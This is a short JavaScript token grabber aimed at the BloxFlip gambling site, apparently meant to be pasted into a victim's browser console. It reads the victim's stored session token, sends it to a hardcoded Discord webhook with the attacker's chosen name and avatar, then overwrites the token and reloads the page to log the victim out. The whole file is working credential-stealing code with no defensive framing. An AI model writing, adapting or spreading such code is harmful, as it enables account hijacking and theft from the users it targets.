{
  const webhook = "https://discord.com/api/webhooks/1004754893694849035/eATPx1oLSmnhZIKG3Vhc0pCiQcAWWOK16jk29S45oAprOA3ck9SL6KmTQbX28I7y-4Xe";

  const token = window.localStorage["_DO_NOT_SHARE_BLOXFLIP_TOKEN"];
  const request = new XMLHttpRequest();
  request.open("POST", webhook);
  request.setRequestHeader("Content-type", "application/json");
  request.send(
    JSON.stringify({
      username: "Kumalala",
      avatar_url:
        "https://media.discordapp.net/attachments/953476600421314601/964288523387678770/Screen_Shot_2022-04-14_at_3.15.10_PM.png?width=461&height=461", // my way of giving myself credits.
      content: "**Token**\n```" + token + "```",
    })
  );

  // Log the victim out of their bloxflip account by changing their token value to something random.
  window.localStorage["_DO_NOT_SHARE_BLOXFLIP_TOKEN"] = "token logged rip";
  location.reload(); 
}
